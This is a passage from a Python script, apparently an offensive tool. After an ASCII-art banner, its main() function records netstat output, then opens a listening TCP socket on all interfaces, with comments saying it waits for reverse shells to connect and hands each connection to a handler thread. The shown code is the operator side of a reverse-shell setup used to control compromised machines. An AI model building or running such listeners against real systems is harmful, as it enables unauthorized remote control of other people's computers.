                                               @@@            @@.        -@@@+ @@@@.......:@@-      
                                              @@@@           @@      .@@..  @@@*    .%=      @@     
                                            @@.   .:        @@.    @@.     @@           :.    @.    
                                           @@@            @@@.@@@@=       #@      #@@@@@@.@   @.    
                                          @@.@    .@@@@@@@@@@@. .@   .     :@@. +++      @@.  @.    
                                         -@.  .      @@@@.  .         @      ..@++        @@ .@     
                                        @@@      .@@@@@.         @     +@@=.#@@@.         .@ @.     
                                     -@@@@.@     @@..     .. @    .@@@@@@@.:..            .@*.      
                                 .%@@@@..       .@@...      @@@@@@@@@ .@@@#                         
               .@@@@@@@@@@@@@@@@@@@@.       @@@@@.   .@@     @@ .@@:@@@.  @@@@                      
                   ... .... .  .@@         =@          @@@@@@@@@.. @. .@@%@@@@@                     
                               @.          @@.          @   . #      @@-      @@.                   
                  .@@@#..     .   ..     . .*    . .=  .       ..   .@@  *@..   @@                  
                     .-@@@.      .   ..   .@     .. @.  .@    .@..@  @@@. ..@    @@.                
                         .@@@ ..#@ @@      @     .@.@. .@@  @@@.*:@@ ...@@@ @.   .@                 
                 .  ..@@@@@@@@@@@@@.%@++  .@.    @@@@.=@@@@         @@@@@@@@@    .@.                
         ...@@*..                @@@.     @@.   @@@@@@@@.                 @@     @@                 
    ..                           @@       @@. @@@.                     .%@@    .@@                  
                                 @@...    @@@@@                    ..@@@%   .*@@                    
                                #@:       .@@#                      .@@@@@@@:                       
                               .@@  .       .@                                                      
                               .@             @.                                                    
                               @    .@@@@     .@.     .                                             
                               @   @@.   @@   .@    .@:                                             
                               @@ @@     .@.  @@.   @ @                                             
                               .@@@@       @@@@@  .@ .@                                             
                                  @@@.        @@@.  .@.                                             
                                    .@@@.           @@                                              
                                       *@@@@@@#%@@@@.                                               
                                            .....           """)
    print("================= Settings =================")
    parseArgs()
    #install dependencies
    print("================= Installing dependencies =================")
    if not os.path.isfile(".run1"):
        #os.system("apt-get update")
        #os.system("apt-get install autogen autoconf libtool")
        #create file indicating that the script has been run
        os.system("touch .run1")
        os.system("netstat -plant > " + DEFAULT_NETSTAT)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    with socket.socket() as s:
        #catch SIGINT
        signal.signal(signal.SIGINT, signal_handler)
        #open port and wait for connection from reverse shell
        s.bind(("0.0.0.0", PORT))
        s.listen()
        print("======= Waiting for shell to connect on port " + str(PORT) + " ========")
        while True:
            conn, addr = s.accept()
            threading.Thread(target=handler,args=(conn,), daemon=True).start() 


if __name__ == "__main__":
    main()